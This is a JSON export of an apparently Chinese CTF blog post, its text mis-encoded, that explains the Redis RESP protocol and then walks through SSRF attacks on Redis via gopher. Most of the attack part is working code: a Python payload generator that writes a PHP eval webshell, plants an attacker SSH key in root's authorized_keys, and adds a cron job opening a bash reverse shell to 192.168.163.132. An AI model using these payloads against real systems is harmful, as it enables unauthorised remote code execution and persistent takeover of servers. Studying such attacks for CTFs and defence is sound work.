{"title":"redisä¸ssrf","slug":"redis","date":"2019-08-10T07:44:26.000Z","updated":"2019-09-03T14:27:08.508Z","comments":true,"path":"api/articles/redis.json","photos":[],"link":"","excerpt":"wula!<br>æˆ‘çˆ±å­¦ä¹ ï¼ğŸ¤«","covers":["http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo4o02mj30kp0cm0u3.jpg","http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umo7bp1qj30kw0bhwfp.jpg","http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo9n4wij30kx0b775h.jpg","http://wx4.sinaimg.cn/mw690/006boCb9ly1g5umodgmhaj30l409ugml.jpg","https://xzfile.aliyuncs.com/media/upload/picture/20190713090053-a9d401f0-a509-1.png","http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umog58ioj30bl03a3z1.jpg"],"content":"<p>wula!<br>æˆ‘çˆ±å­¦ä¹ ï¼ğŸ¤«</p>\n<a id=\"more\"></a>\n\n<h1 id=\"redisåè®®åˆ†æ\"><a href=\"#redisåè®®åˆ†æ\" class=\"headerlink\" title=\"redisåè®®åˆ†æ\"></a>redisåè®®åˆ†æ</h1><p>tcpdumpæŠ“åŒ…</p>\n<pre><code>tcpdump -i lo port 6379 -w redis.pcap</code></pre><p>åœ¨redisæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>\n<pre><code>127.0.0.1:6379&gt; set name test\nOK\n127.0.0.1:6379&gt; get name\n&quot;test&quot;\n127.0.0.1:6379&gt; </code></pre><h2 id=\"RESPåè®®\"><a href=\"#RESPåè®®\" class=\"headerlink\" title=\"RESPåè®®\"></a>RESPåè®®</h2><p>RESPåœ¨Redisä¸­ç”¨ä½œè¯·æ±‚-å“åº”åè®®çš„æ–¹å¼å¦‚ä¸‹</p>\n<pre><code>1. å®¢æˆ·ç«¯å°†å‘½ä»¤ä½œä¸º`Bulk Strings`çš„RESPæ•°ç»„å‘é€åˆ°RedisæœåŠ¡å™¨ã€‚\n2. æœåŠ¡å™¨æ ¹æ®å‘½ä»¤å®ç°å›å¤ä¸€ç§RESPç±»å‹ã€‚</code></pre><p>åœ¨RESPä¸­ã€‚æŸäº›æ•°æ®çš„ç±»å‹å–å†³äºç¬¬ä¸€ä¸ªå­—èŠ‚ï¼š</p>\n<ol>\n<li>å¯¹äº<code>Simple Strings</code>ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯+</li>\n<li>å¯¹äº<code>error</code>,å›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯-</li>\n<li>å¯¹äº<code>Integer</code>,ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯:</li>\n<li>å¯¹äº<code>Bulk Strings</code>,å›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯$</li>\n<li>å¯¹äº<code>array</code>,å›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯*</li>\n<li>æ­¤å¤–ï¼Œrespèƒ½å¤Ÿä½¿ç”¨ç¨åæŒ‡å®šçš„<code>Bulk Strings</code>æˆ–<code>Array</code>çš„ç‰¹æ®Šå˜ä½“æ¥è¡¨ç¤º<code>Null</code>å€¼</li>\n<li>åœ¨RESPä¸­ï¼Œåè®®çš„ä¸åŒéƒ¨åˆ†å§‹ç»ˆä»¥<code>&quot;\\r\\n&quot;(CRLF)</code>ç»“æŸ</li>\n</ol>\n<p>ç°åœ¨æ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬æŠ“çš„åŒ…</p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo4o02mj30kp0cm0u3.jpg\" alt=\"æŠ“åŒ…åè®®åˆ†æ1\"></p>\n<p><img src=\"http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umo7bp1qj30kw0bhwfp.jpg\" alt=\"åè®®åˆ†æ2\"></p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo9n4wij30kx0b775h.jpg\" alt=\"åè®®åˆ†æ3\"></p>\n<p><img src=\"http://wx4.sinaimg.cn/mw690/006boCb9ly1g5umodgmhaj30l409ugml.jpg\" alt=\"åè®®åˆ†æ4\"></p>\n<p>æ•´ä½“æ¥çœ‹ä¸€ä¸‹</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190713090053-a9d401f0-a509-1.png\" alt=\"æ•´ä¸ªé€šä¿¡è¿‡ç¨‹\"></p>\n<p>æ­£å¦‚æˆ‘ä»¬å‰é¢æ‰€è¯´çš„ï¼Œå®¢æˆ·ç«¯å‘å°†å‘½ä»¤ä½œä¸º<code>Bulk Strings</code>çš„RESPæ•°ç»„å‘é€åˆ°RedisæœåŠ¡å™¨ï¼Œç„¶åæœåŠ¡å™¨æ ¹æ®å‘½ä»¤å®ç°å›å¤ç»™å®¢æˆ·ç«¯ä¸€ç§RESPç±»å‹ã€‚</p>\n<p>æˆ‘ä»¬å°±æ‹¿ä¸Šé¢çš„æ•°æ®åŒ…åˆ†æï¼Œé¦–å…ˆæ˜¯<code>*3</code>ï¼Œä»£è¡¨æ•°ç»„çš„é•¿åº¦ä¸º3ï¼ˆå¯ä»¥ç®€å•ç†è§£ä¸ºç”¨ç©ºæ ¼ä¸ºåˆ†éš”ç¬¦å°†å‘½ä»¤åˆ†å‰²ä¸º[â€œsetâ€,â€nameâ€,â€testâ€]ï¼‰ï¼›<code>$4</code>ä»£è¡¨å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œ<code>0d0a</code>å³<code>\\r\\n</code>è¡¨ç¤ºç»“æŸç¬¦ï¼›<code>+OK</code>è¡¨ç¤ºæœåŠ¡ç«¯æ‰§è¡ŒæˆåŠŸåè¿”å›çš„å­—ç¬¦ä¸²</p>\n<h1 id=\"Redisé…åˆgopheråè®®è¿›è¡ŒSSRF\"><a href=\"#Redisé…åˆgopheråè®®è¿›è¡ŒSSRF\" class=\"headerlink\" title=\"Redisé…åˆgopheråè®®è¿›è¡ŒSSRF\"></a>Redisé…åˆgopheråè®®è¿›è¡ŒSSRF</h1><h2 id=\"æ¡ä»¶\"><a href=\"#æ¡ä»¶\" class=\"headerlink\" title=\"æ¡ä»¶\"></a>æ¡ä»¶</h2><p>èƒ½æœªæˆæƒæˆ–é€šè¿‡å¼±å£ä»¤è®¿é—®åˆ°redisæœåŠ¡å™¨</p>\n<h2 id=\"åˆ©ç”¨\"><a href=\"#åˆ©ç”¨\" class=\"headerlink\" title=\"åˆ©ç”¨\"></a>åˆ©ç”¨</h2><p>rediså¸¸è§SSRFæ”»å‡»æ–¹å¼å¤§æ¦‚è¿™å‡ ç§ï¼š</p>\n<ol>\n<li>ç»å¯¹è·¯å¾„å†™webshell</li>\n<li>å†™sshå…¬é’¥</li>\n<li>å†™contrabè®¡åˆ’ä»»åŠ¡åå¼¹shell</li>\n</ol>\n<h3 id=\"ç»å¯¹è·¯å¾„å†™webshell\"><a href=\"#ç»å¯¹è·¯å¾„å†™webshell\" class=\"headerlink\" title=\"ç»å¯¹è·¯å¾„å†™webshell\"></a>ç»å¯¹è·¯å¾„å†™webshell</h3><p>æ„é€ rediså‘½ä»¤</p>\n<pre><code>flushall\nset 1 &apos;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&apos;\nconfig set dir /var/www/html\nconfig set dbfilename shell.php\nsave</code></pre><p>è½¬æ¢ä¸ºredis RESPæ ¼å¼</p>\n<pre><code>import urllib\nprotocol=&quot;gopher://&quot;\nip=&quot;192.168.163.128&quot;\nport=&quot;6379&quot;\nshell=&quot;\\n\\n&lt;?php eval($_GET[\\&quot;cmd\\&quot;]);?&gt;\\n\\n&quot;\nfilename=&quot;shell.php&quot;\npath=&quot;/var/www/html&quot;\npasswd=&quot;&quot;\ncmd=[&quot;flushall&quot;,\n     &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),\n     &quot;config set dir {}&quot;.format(path),\n     &quot;config set dbfilename {}&quot;.format(filename),\n     &quot;save&quot;\n     ]\nif passwd:\n    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))\npayload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;\ndef redis_format(arr):\n    CRLF=&quot;\\r\\n&quot;\n    redis_arr = arr.split(&quot; &quot;)\n    cmd=&quot;&quot;\n    cmd+=&quot;*&quot;+str(len(redis_arr))\n    for x in redis_arr:\n        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)\n    cmd+=CRLF\n    return cmd\n\nif __name__==&quot;__main__&quot;:\n    for x in cmd:\n        payload += urllib.quote(redis_format(x))\n    print payload</code></pre><p>ç”Ÿæˆä¹‹åç”¨curlrç„¶åæŸ¥è¯¢shellæ˜¯å¦å†™å…¥</p>\n<p><img src=\"http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umog58ioj30bl03a3z1.jpg\" alt=\"å†™shell\"></p>\n<p>å†™å…¥æˆåŠŸ</p>\n<h3 id=\"å†™sshå…¬é’¥\"><a href=\"#å†™sshå…¬é’¥\" class=\"headerlink\" title=\"å†™sshå…¬é’¥\"></a>å†™sshå…¬é’¥</h3><p>å¦‚æœ<code>.ssh</code>ç›®å½•å­˜åœ¨ï¼Œåˆ™ç›´æ¥å†™å…¥<code>~/.ssh/authorized_keys</code><br>å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™å¯ä»¥åˆ©ç”¨<code>crontab</code>åˆ›å»ºè¯¥ç›®å½•</p>\n<p>æ„é€ rediså‘½ä»¤</p>\n<pre><code>flushall\nset 1 &apos;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n&apos;\nconfig set dir /root/.ssh/\nconfig set dbfilename authorized_keys\nsave</code></pre><p>æ”¹ç¬¬ä¸€ä¸ªè„šæœ¬</p>\n<pre><code>filename=&quot;authorized_keys&quot;\nssh_pub=&quot;\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\\n\\n&quot;\npath=&quot;/root/.ssh/&quot;</code></pre><p>è¿˜æ˜¯ç”¨curlæ‰“ä¸€å‘</p>\n<h3 id=\"åˆ©ç”¨contrabè®¡åˆ’åå¼¹shell\"><a href=\"#åˆ©ç”¨contrabè®¡åˆ’åå¼¹shell\" class=\"headerlink\" title=\"åˆ©ç”¨contrabè®¡åˆ’åå¼¹shell\"></a>åˆ©ç”¨contrabè®¡åˆ’åå¼¹shell</h3><p>Centosçš„å®šæ—¶ä»»åŠ¡åœ¨<code>/var/spool/cron/&lt;username&gt;</code>å’Œ/etc/crontabï¼Œé«˜ç‰ˆæœ¬redisé»˜è®¤å¯åŠ¨æ˜¯redisæƒé™ï¼Œæ•…æ— æ³•å®ç°</p>\n<p>æ„é€ rediså‘½ä»¤</p>\n<pre><code>flushall\nset 1 &apos;\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.163.132/2333 0&gt;&amp;1\\n\\n&apos;\nconfig set dir /var/spool/cron/\nconfig set dbfilename root\nsave</code></pre><p>æ”¹ç¬¬ä¸€ä¸ªå‘½ä»¤</p>\n<pre><code>reverse_ip=&quot;192.168.163.132&quot;\nreverse_port=&quot;2333&quot;\ncron=&quot;\\n\\n\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\\n\\n\\n\\n&quot;%(reverse_ip,reverse_port)\nfilename=&quot;root&quot;\npath=&quot;/var/spool/cron&quot;</code></pre><h1 id=\"å‚è€ƒé“¾æ¥\"><a href=\"#å‚è€ƒé“¾æ¥\" class=\"headerlink\" title=\"å‚è€ƒé“¾æ¥\"></a>å‚è€ƒé“¾æ¥</h1><blockquote>\n<p><a href=\"https://xz.aliyun.com/t/5665#toc-11\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/5665#toc-11</a><br><a href=\"https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf\" target=\"_blank\" rel=\"noopener\">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p>\n</blockquote>\n","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"redis","slug":"redis","count":2,"path":"api/tags/redis.json"},{"name":"ssrf","slug":"ssrf","count":3,"path":"api/tags/ssrf.json"}]}